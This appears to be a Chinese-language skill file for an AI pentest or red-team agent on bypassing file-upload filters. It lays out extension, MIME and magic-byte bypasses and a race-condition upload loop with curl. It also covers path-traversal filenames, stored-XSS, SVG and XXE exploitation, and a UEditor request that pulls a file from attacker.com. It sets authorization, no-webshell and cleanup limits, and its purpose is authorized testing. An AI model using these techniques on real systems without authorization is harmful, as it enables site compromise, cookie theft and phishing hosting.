---
name: file-upload
domain: file-upload
modes: [src, redteam, pentest]
exit_artifacts: [reproduction, impact]
---

# 文件上传深挖（中高 ROI）

> **定位**：reflexes 有上传绕过清单但散在各处。本 skill 补**三层绕过矩阵 + 竞态上传 + 上传后利用**。

## Domain

- 接口接受文件上传：`multipart/form-data` / Base64 body / `filename` 参数
- 上传后文件可访问（同域/CDN/可猜测路径）
- 业务功能：头像/附件/导入/编辑器(UEditor)/报表导出
- modes: src 中高（上传→XSS/钓鱼/配合链4）；pentest 高（上传→webshell 须授权）

## Boundaries

- **Webshell 内容禁止**（danger-guard 硬拦 `.php/.jsp/.aspx` 等危险后缀）
- 允许上传：HTML/SVG/PDF/TXT（验证可执行/可托管，非攻击 payload）
- 上传后验证完**立即删除**（报告写 `[清理动作]`）
- 不上传到他人目录/不覆盖他人文件
- 上传 webshell 须 _PENDING 请示 + 授权明确（pentest only）

## Pivot Hints

- 后缀黑名单 → 双扩展名 `test.jpg.html` / 大小写 `.HTML` / `.html::$DATA`
- MIME 检查 → 改 `Content-Type: image/jpeg` 但文件内容是 HTML
- 内容检查 → HTML 前加 JPEG magic bytes `\xFF\xD8\xFF`
- 路径可控 → 指定 `filename=../../../var/www/html/test.html`（路径穿越上传）
- 上传后被 WAF 拦内容 → `var a=alert;a(1)` 变量别名（见 waf-evasion.md）

## Exit Evidence

### src
- E2: 上传 curl + 访问 URL 返回上传内容
- E3: 上传 HTML 同域可执行（存储型 XSS）/ CDN 可托管（钓鱼）

## Tactics

### 1. 三层绕过矩阵（每层 2-3 包）

#### 扩展名层
```
黑名单绕过: .html / .htm / .shtml / .svg / .pdf / .xml
双扩展名:   test.jpg.html / test.png.htm
大小写:     .HTML / .Htm
特殊后缀:   .html::$DATA / .html%00.jpg / .html\x0a
Content-Disposition: filename="test.html"; filename*=UTF-8''test.html
```

#### MIME 层
```bash
# 改 Content-Type 骗 MIME 检查
curl -F "file=@test.html;type=image/jpeg" https://target.com/upload
```

#### 内容层
```bash
# HTML 前加 JPEG magic bytes 骗内容检查
printf '\xFF\xD8\xFF\xE0' > test.html
cat payload.html >> test.html
curl -F "file=@test.html;type=image/jpeg" https://target.com/upload
```

### 2. 竞态上传（条件竞争，5-10 包）

有些上传逻辑：先保存文件 → 再检查/删除。在"保存"和"删除"之间访问文件：

```bash
# 并发上传 + 并发访问
for i in $(seq 1 20); do
  curl -F "file=@shell.html" https://target.com/upload &
  curl https://target.com/uploads/shell.html &
done
```

适用场景：服务端先存临时文件再校验，校验失败删除但有窗口期。

### 3. 上传后利用

| 上传内容 | 利用方式 | 危害 |
|---|---|---|
| HTML | 同域存储型 XSS（窃取 cookie） | 中-高 |
| SVG | 内嵌 JS 的 SVG（`<svg onload>` / `<script>`） | 中 |
| PDF | 钓鱼页面（可信域名） | 中 |
| XML | XXE（如果服务端解析上传的 XML） | 高 |
| 图片 | 路径穿越上传到 webroot（`filename=../../../var/www/html/x.html`） | 高 |

### 4. 编辑器特化（UEditor/CKEditor/KindEditor）

```
# UEditor 任意文件上传
POST /ueditor/php/controller.php?action=catchimage
source[]={"src":"http://attacker.com/test.html"}

# 见 memory/playbooks/playbook-ueditor-upload-arbitrary-file.md
```

## Common misses

- **只测后缀绕过** → MIME + 内容检查常被忽略
- **上传后不验证路径** → 上传成功但不知道文件在哪 = 无法证明危害
- **不测竞态** → 先存后删的逻辑只能竞态利用
- **上传 webshell 到生产** → 违法（非授权 pentest 场景）
- **不清理** → 上传的文件留在目标上 = 影响业务

## Verification

- **verified**：上传 + 访问返回可执行内容（HTML/SVG）+ 同域/可信域
- **phenomenon**：可上传但 Content-Type 强制 octet-stream / 路径不可访问
- **rejected**：上传被三层拦截 / 上传后文件不可访问

## ⚠️ 红线

- **Webshell 禁止**（danger-guard 硬拦 `.php/.jsp/.aspx`）
- 允许 HTML/SVG/PDF 验证，上传后**立即删除**
- 不覆盖他人文件 / 不上传到他人目录
- webshell 须 _PENDING + 授权明确（pentest only）

## Related

- `doctrine/reflexes.md` 文件上传段 — 基础绕过清单
- `memory/playbooks/playbook-ueditor-upload-arbitrary-file.md` — UEditor 实战
- `skills/chain-playbook.md` 链 4 — 上传→CDN→钓鱼/XSS
- `skills/fingerprint/waf-evasion.md` — 上传内容被 WAF 拦时绕过
